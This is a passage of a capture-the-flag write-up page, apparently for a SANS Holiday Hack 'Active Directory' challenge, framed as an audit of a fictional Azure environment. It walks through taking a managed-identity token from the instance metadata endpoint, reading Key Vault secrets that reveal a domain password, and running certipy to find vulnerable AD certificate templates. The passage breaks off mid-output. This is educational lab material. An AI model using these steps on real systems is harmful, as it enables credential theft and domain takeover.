    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m6.91 5.5 2.3 2.29-1.42 1.42-2.29-2.3-2.29 2.3-1.42-1.42 2.3-2.29-2.3-2.29 1.42-1.42 2.29 2.3 2.29-2.3 1.42 1.42m13 13-1.42-1.42-2.29 2.3-2.29-2.3-1.42 1.42 2.3 2.29-2.3 2.29 1.42 1.42 2.29-2.3 2.29 2.3 1.42-1.42-2.3-2.29m.49-11.67L17.18 11 15.6 9.73l1.17-1.5a9.08 9.08 0 0 0-6.66 5.62A4.5 4.5 0 1 1 7.5 13a4 4 0 0 1 .78.08 11.27 11.27 0 0 1 8.15-6.82L15 5.18l1.27-1.58M10 17.5A2.5 2.5 0 1 0 7.5 20a2.5 2.5 0 0 0 2.5-2.5Z"/></svg>
  
  <span class="md-ellipsis">
    Elf Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o15/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m13 21 2-1 2 1v-7h-4m4-5V7l-2 1-2-1v2l-2 1 2 1v2l2-1 2 1v-2l2-1m1-7H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h7v-2H4V5h16v10h-1v2h1a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2m-9 5H5V6h6m-2 5H5V9h4m2 5H5v-2h6Z"/></svg>
  
  <span class="md-ellipsis">
    Certificate SSHenanigans
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" checked>
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Steampunk Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Steampunk Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o17/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 1c-2.76 0-5 2.24-5 5v2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12c1.11 0 2-.89 2-2V10a2 2 0 0 0-2-2h-1V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2h2V6c0-2.76-2.24-5-5-5m-8 12a2 2 0 0 1 2 2c0 1.11-.89 2-2 2a2 2 0 1 1 0-4Z"/></svg>
  
  <span class="md-ellipsis">
    Faster Lock Combination
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o18/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 10a2 2 0 0 1 2 2 2 2 0 0 1-.47 1.29L16.7 22h-2.13L12 14.93 9.43 22H7.3l3.17-8.71A2 2 0 0 1 10 12a2 2 0 0 1 2-2m0-2a4 4 0 0 0-4 4c0 .5.1 1 .28 1.46l-.88 2.4A6.026 6.026 0 0 1 6 12a6 6 0 0 1 6-6 6 6 0 0 1 6 6c0 1.47-.53 2.81-1.4 3.86l-.88-2.4C15.9 13 16 12.5 16 12a4 4 0 0 0-4-4m0-4a8 8 0 0 0-8 8c0 2.36 1 4.5 2.64 5.94l-.72 2A10.005 10.005 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10c0 3.23-1.54 6.11-3.92 7.94l-.72-2C19 16.5 20 14.36 20 12a8 8 0 0 0-8-8Z"/></svg>
  
  <span class="md-ellipsis">
    The Captain's Comms
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 14a1 1 0 0 1 1 1 1 1 0 0 1-1 1 5 5 0 0 1-5-5 5 5 0 0 1 5-5c1-2.35 3.3-4 6-4 3.43 0 6.24 2.66 6.5 6.03L19 8a4 4 0 0 1 4 4 4 4 0 0 1-4 4h-1a1 1 0 0 1-1-1 1 1 0 0 1 1-1h1a2 2 0 0 0 2-2 2 2 0 0 0-2-2h-2V9a5 5 0 0 0-5-5C9.5 4 7.45 5.82 7.06 8.19 6.73 8.07 6.37 8 6 8a3 3 0 0 0-3 3 3 3 0 0 0 3 3m1.88 4.07 2.19-.57-1.61-1.62c-.39-.38-.39-1.02 0-1.42.39-.39 1.04-.39 1.42 0l1.62 1.61.57-2.19a1 1 0 1 1 1.93.52l-.59 2.19L15.6 16a1 1 0 1 1 .52 1.93l-2.19.57 1.61 1.62c.39.38.39 1.03 0 1.42-.39.39-1.04.39-1.42 0l-1.62-1.61-.57 2.19A1 1 0 1 1 10 21.6l.59-2.19L8.4 20a1 1 0 1 1-.52-1.93Z"/></svg>
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 14a1 1 0 0 1 1 1 1 1 0 0 1-1 1 5 5 0 0 1-5-5 5 5 0 0 1 5-5c1-2.35 3.3-4 6-4 3.43 0 6.24 2.66 6.5 6.03L19 8a4 4 0 0 1 4 4 4 4 0 0 1-4 4h-1a1 1 0 0 1-1-1 1 1 0 0 1 1-1h1a2 2 0 0 0 2-2 2 2 0 0 0-2-2h-2V9a5 5 0 0 0-5-5C9.5 4 7.45 5.82 7.06 8.19 6.73 8.07 6.37 8 6 8a3 3 0 0 0-3 3 3 3 0 0 0 3 3m1.88 4.07 2.19-.57-1.61-1.62c-.39-.38-.39-1.02 0-1.42.39-.39 1.04-.39 1.42 0l1.62 1.61.57-2.19a1 1 0 1 1 1.93.52l-.59 2.19L15.6 16a1 1 0 1 1 .52 1.93l-2.19.57 1.61 1.62c.39.38.39 1.03 0 1.42-.39.39-1.04.39-1.42 0l-1.62-1.61-.57 2.19A1 1 0 1 1 10 21.6l.59-2.19L8.4 20a1 1 0 1 1-.52-1.93Z"/></svg>
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      Objective
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      Hints
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      Response
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
        
          
          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Space Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            Space Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o20/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m11.86 2-.52 1.93c4.41.85 7.86 4.3 8.71 8.72l1.95-.52C20.95 7.03 16.96 3.04 11.86 2m-1.04 3.86-.52 1.95c3.04.46 5.42 2.84 5.88 5.87l1.94-.52c-.66-3.72-3.57-6.66-7.3-7.3m-7.1 3.83A7.96 7.96 0 0 0 5 18.28V22h3v-1.59c.95.39 1.97.59 3 .59 1.14 0 2.27-.25 3.3-.72L3.72 9.69m6.07.07-.53 1.96a3 3 0 0 1 3 3l1.97-.52c-.23-2.34-2.1-4.2-4.44-4.44Z"/></svg>
  
  <span class="md-ellipsis">
    Space Island Door Access Speaker
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Extras
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Extras
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../easter_eggs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Easter Eggs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">⚓︎</a></h1>
<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M287.9 0c9.2 0 17.6 5.2 21.6 13.5l68.6 141.3 153.2 22.6c9 1.3 16.5 7.6 19.3 16.3s.5 18.1-5.9 24.5L433.6 328.4 459.8 484c1.5 9-2.2 18.1-9.7 23.5s-17.3 6-25.3 1.7l-137-73.2L151 509.1c-8.1 4.3-17.9 3.7-25.3-1.7s-11.2-14.5-9.7-23.5l26.2-155.6L31.1 218.2c-6.5-6.4-8.7-15.9-5.9-24.5s10.3-14.9 19.3-16.3l153.2-22.6 68.6-141.3C270.4 5.2 278.7 0 287.9 0zm0 79-52.5 108.2c-3.5 7.1-10.2 12.1-18.1 13.3L99 217.9l85.9 85.1c5.5 5.5 8.1 13.3 6.8 21l-20.3 119.7 105.2-56.2c7.1-3.8 15.6-3.8 22.6 0l105.2 56.2-20.2-119.6c-1.3-7.7 1.2-15.5 6.8-21l85.9-85.1-118.3-17.5c-7.8-1.2-14.6-6.1-18.1-13.3L287.9 79z"/></svg></span><br/>
<strong>Direct link</strong>: --</p>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
<div class="admonition question">
<p class="admonition-title">Request</p>
<p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p>
</div>
<details class="quote">
<summary>Ribb Bonbowford</summary>
<p>Hi there, could you do me a quick favor?<br/>
Can you go and check on Alabaster Snowball for me? He's at Rainraster Cliffs on Pixel Island. I heard some rumors he's been experimenting with ChatNPT again and I'm a little worried about what he's cooking up.<br/>
Thank you so much!<br/>
Please let me know what you find out.<br/><br/>
Hello, I'm Ribb Bonbowford. Nice to meet you!<br/>
Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.<br/>
Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.<br/>
I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.<br/>
I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.<br/>
Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.<br/></p>
</details>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="tip">
<summary>Misconfiguration ADventures</summary>
<p><em>From: Alabaster Snowball</em><br/>
<em>Objective: Active Directory</em><br/>
Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>
</details>
<details class="tip">
<summary>Useful Tools</summary>
<p><em>From: Ribb Bonbowford</em><br/>
<em>Objective: Active Directory</em><br/>
It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<p>Once we complete <a href="../o15/">Certificate SSHenanigins</a>, we can work on this challenge. Now that we can log in to the ssh server as <code>alabaster</code>, let's see what else we can access. </p>
<p><div class="highlight"><pre><span></span><code>┌──(kali㉿kali)-[~/.ssh]
└─$ ssh -i holiday-cert.pub -i ~/.ssh/holiday alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket                                                
alabaster@ssh-server-vm:~$    
</code></pre></div>
There is impacket installed, which will probably come in handy for this challenge based on the hint from Ribb Bonbowford. In order to not be stuck floundering around the massive Azure REST API options for hours, I asked ChatGPT for some assistance.</p>
<details class="example">
<summary>See AI Assistance</summary>
<p><strong>My Prompt:</strong> what azure rest api can i use to enumerate all the resources I have access to on an azure VM?<br/>
<strong>ChatGPT Response:</strong> To enumerate all the resources you have access to on an Azure VM using the Azure REST API, you typically use the Azure Resource Manager (ARM) API. The specific API you would use depends on the type of resources you want to enumerate. Generally, you'd start with the Resource Groups API to list resource groups and then drill down into specific resource types within those groups.<br/>
Here is a basic outline of the steps using Azure REST APIs:<br/>
<strong>Get Access Token:</strong> <em>(snipped this for brevity as we already know how to do this)</em><br/>
<strong>List Resource Groups:</strong> <em>(snipped this for brevity as we already know how to do this)</em><br/>
<strong>List Resources within a Resource Group:</strong><br/>
Once you have the resource group name, you can list the resources within that group using:<br/>
<div class="highlight"><pre><span></span><code>GET https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/resources?api-version=2021-04-01
</code></pre></div>
Replace {subscription-id} with your subscription ID and {resource-group-name} with the actual resource group name.</p>
</details>
<p>When we use the API endpoint suggested by ChatGPT, we are able to retrieve the names of two vaults: <code>northpole-ssh-certs-kv</code> and <code>northpole-it-kv</code>.</p>
<p><div class="highlight"><pre><span></span><code>curl -s -H &quot;Authorization: Bearer &lt;ACCESSTOKENHERE&gt;&quot; https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01

{&quot;value&quot;:[{&quot;id&quot;:&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv&quot;,&quot;name&quot;:&quot;northpole-ssh-certs-kv&quot;,&quot;type&quot;:&quot;Microsoft.KeyVault/vaults&quot;,&quot;location&quot;:&quot;eastus&quot;,&quot;tags&quot;:{}},{&quot;id&quot;:&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv&quot;,&quot;name&quot;:&quot;northpole-it-kv&quot;,&quot;type&quot;:&quot;Microsoft.KeyVault/vaults&quot;,&quot;location&quot;:&quot;eastus&quot;,&quot;tags&quot;:{}}]}
</code></pre></div>
Let's look for <a href="https://learn.microsoft.com/en-us/rest/api/keyvault/keyvault/vaults/list-by-resource-group?view=rest-keyvault-keyvault-2022-07-01&amp;tabs=HTTP">more information</a> about these vaults.</p>
<p><div class="highlight"><pre><span></span><code>curl -s -H &quot;Authorization: Bearer &lt;ACCESSTOKENHERE&gt;&quot; https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01

{&quot;value&quot;:[{&quot;id&quot;:&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv&quot;,&quot;name&quot;:&quot;northpole-it-kv&quot;,&quot;type&quot;:&quot;Microsoft.KeyVault/vaults&quot;,&quot;location&quot;:&quot;eastus&quot;,&quot;tags&quot;:{},&quot;systemData&quot;:{&quot;createdBy&quot;:&quot;thomas@sanshhc.onmicrosoft.com&quot;,&quot;createdByType&quot;:&quot;User&quot;,&quot;createdAt&quot;:&quot;2023-10-30T13:17:02.532Z&quot;,&quot;lastModifiedBy&quot;:&quot;thomas@sanshhc.onmicrosoft.com&quot;,&quot;lastModifiedByType&quot;:&quot;User&quot;,&quot;lastModifiedAt&quot;:&quot;2023-10-30T13:17:02.532Z&quot;},&quot;properties&quot;:{&quot;sku&quot;:{&quot;family&quot;:&quot;A&quot;,&quot;name&quot;:&quot;Standard&quot;},&quot;tenantId&quot;:&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;,&quot;accessPolicies&quot;:[],&quot;enabledForDeployment&quot;:false,&quot;enabledForDiskEncryption&quot;:false,&quot;enabledForTemplateDeployment&quot;:false,&quot;enableSoftDelete&quot;:true,&quot;softDeleteRetentionInDays&quot;:90,&quot;enableRbacAuthorization&quot;:true,&quot;vaultUri&quot;:&quot;https://northpole-it-kv.vault.azure.net/&quot;,&quot;provisioningState&quot;:&quot;Succeeded&quot;,&quot;publicNetworkAccess&quot;:&quot;Enabled&quot;}},{&quot;id&quot;:&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv&quot;,&quot;name&quot;:&quot;northpole-ssh-certs-kv&quot;,&quot;type&quot;:&quot;Microsoft.KeyVault/vaults&quot;,&quot;location&quot;:&quot;eastus&quot;,&quot;tags&quot;:{},&quot;systemData&quot;:{&quot;createdBy&quot;:&quot;thomas@sanshhc.onmicrosoft.com&quot;,&quot;createdByType&quot;:&quot;User&quot;,&quot;createdAt&quot;:&quot;2023-11-12T01:47:13.059Z&quot;,&quot;lastModifiedBy&quot;:&quot;thomas@sanshhc.onmicrosoft.com&quot;,&quot;lastModifiedByType&quot;:&quot;User&quot;,&quot;lastModifiedAt&quot;:&quot;2023-11-12T01:50:52.742Z&quot;},&quot;properties&quot;:{&quot;sku&quot;:{&quot;family&quot;:&quot;A&quot;,&quot;name&quot;:&quot;standard&quot;},&quot;tenantId&quot;:&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;,&quot;accessPolicies&quot;:[{&quot;tenantId&quot;:&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;,&quot;objectId&quot;:&quot;0bc7ae9d-292d-4742-8830-68d12469d759&quot;,&quot;permissions&quot;:{&quot;keys&quot;:[&quot;all&quot;],&quot;secrets&quot;:[&quot;all&quot;],&quot;certificates&quot;:[&quot;all&quot;],&quot;storage&quot;:[&quot;all&quot;]}},{&quot;tenantId&quot;:&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;,&quot;objectId&quot;:&quot;1b202351-8c85-46f1-81f8-5528e92eb7ce&quot;,&quot;permissions&quot;:{&quot;secrets&quot;:[&quot;get&quot;]}}],&quot;enabledForDeployment&quot;:false,&quot;enableSoftDelete&quot;:true,&quot;softDeleteRetentionInDays&quot;:90,&quot;vaultUri&quot;:&quot;https://northpole-ssh-certs-kv.vault.azure.net/&quot;,&quot;provisioningState&quot;:&quot;Succeeded&quot;,&quot;publicNetworkAccess&quot;:&quot;Enabled&quot;}}],&quot;nextLink&quot;:&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg==&quot;}
</code></pre></div>
We can see the vault URIs <code>https://northpole-it-kv.vault.azure.net/</code> and <code>https://northpole-ssh-certs-kv.vault.azure.net/</code>. I also saw some permissions information for the <code>northpole-ssh-certs-kv</code> vault like <code>permissions":{"keys":["all"],"secrets":["all"],"certificates":["all"],"storage":["all"]}}</code>. This sounded promising so I focused on this vault first (hint: never assume one <em>must</em> correct without checking other options). </p>
<p>AFter some trial and error with diffrent Keys and Secrets API enpoints, I determined the <a href="https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secrets/get-secrets?view=rest-keyvault-secrets-7.4&amp;tabs=HTTP">Get Secrets API</a> has what we need. This requires a different access token that the type we have been using for <code>management.azure.com</code>. We now need one for <code>vault.azure.net</code>, so let's get that first.</p>
<p><div class="highlight"><pre><span></span><code>curl &#39;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fvault.azure.net&#39; -H Metadata:true -s
{&quot;access_token&quot;:&quot;&lt;ACCESSTOKENHERE&gt;&quot;,&quot;client_id&quot;:&quot;b84e06d3-aba1-4bcc-9626-2e0d76cba2ce&quot;,&quot;expires_in&quot;:&quot;85627&quot;,&quot;expires_on&quot;:&quot;1703195568&quot;,&quot;ext_expires_in&quot;:&quot;86399&quot;,&quot;not_before&quot;:&quot;1703108868&quot;,&quot;resource&quot;:&quot;https://vault.azure.net&quot;,&quot;token_type&quot;:&quot;Bearer&quot;}
</code></pre></div>
Then we use this access token to get the secrets on the vault.</p>
<p><div class="highlight"><pre><span></span><code>curl -s -H &quot;Authorization: Bearer &lt;ACCESSTOKENHERE&gt;&quot; https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4

{&quot;value&quot;:[{&quot;id&quot;:&quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript&quot;,&quot;attributes&quot;:{&quot;enabled&quot;:true,&quot;created&quot;:1699564823,&quot;updated&quot;:1699564823,&quot;recoveryLevel&quot;:&quot;Recoverable+Purgeable&quot;,&quot;recoverableDays&quot;:90},&quot;tags&quot;:{}}],&quot;nextLink&quot;:null}
</code></pre></div>
We have a script name <code>tmpAddUserScript</code>, let's get more information on that secret.</p>
<p><div class="highlight"><pre><span></span><code>curl -s -H &quot;Authorization: Bearer &lt;ACCESSTOKENHERE&gt;&quot; https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/?api-version=7.4

{&quot;value&quot;:&quot;Import-Module ActiveDirectory; $UserName = \&quot;elfy\&quot;; $UserDomain = \&quot;northpole.local\&quot;; $UserUPN = \&quot;$UserName@$UserDomain\&quot;; $Password = ConvertTo-SecureString \&quot;J4`ufC49/J4766\&quot; -AsPlainText -Force; $DCIP = \&quot;10.0.0.53\&quot;; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \&quot;\&quot; -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru&quot;,&quot;id&quot;:&quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d&quot;,&quot;attributes&quot;:{&quot;enabled&quot;:true,&quot;created&quot;:1699564823,&quot;updated&quot;:1699564823,&quot;recoveryLevel&quot;:&quot;Recoverable+Purgeable&quot;,&quot;recoverableDays&quot;:90},&quot;tags&quot;:{}}
</code></pre></div>
We have made a break through! We now have the Domain Controller (DC) name, IP, and a username, and password. Let's see if we can get access to the DC.<br/>
I read a bit about domain escalation techniques<br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a><br/>
<a href="https://raxis.com/blog/ad-series-active-directory-certificate-services-adcs-misconfiguration-exploits/">https://raxis.com/blog/ad-series-active-directory-certificate-services-adcs-misconfiguration-exploits/</a><br/>
and reviewed some information from a <a href="../o4/">previous challenge</a>.</p>
<p>Using Certipy we find a vulnerable certificate template:</p>
<div class="highlight"><pre><span></span><code>alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -u elfy -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

Password:
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via CSRA
[!] Got error while trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for &#39;northpole-npdc01-CA&#39;
[*] Saved BloodHound data to &#39;20231227030304_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to &#39;20231227030304_Certipy.txt&#39;
[*] Saved JSON output to &#39;20231227030304_Certipy.json&#39;
alabaster@ssh-server-vm:~/impacket$ cat 20231227030304_Certipy.json 
{
  &quot;Certificate Authorities&quot;: {
    &quot;0&quot;: {
      &quot;CA Name&quot;: &quot;northpole-npdc01-CA&quot;,
      &quot;DNS Name&quot;: &quot;npdc01.northpole.local&quot;,
      &quot;Certificate Subject&quot;: &quot;CN=northpole-npdc01-CA, DC=northpole, DC=local&quot;,
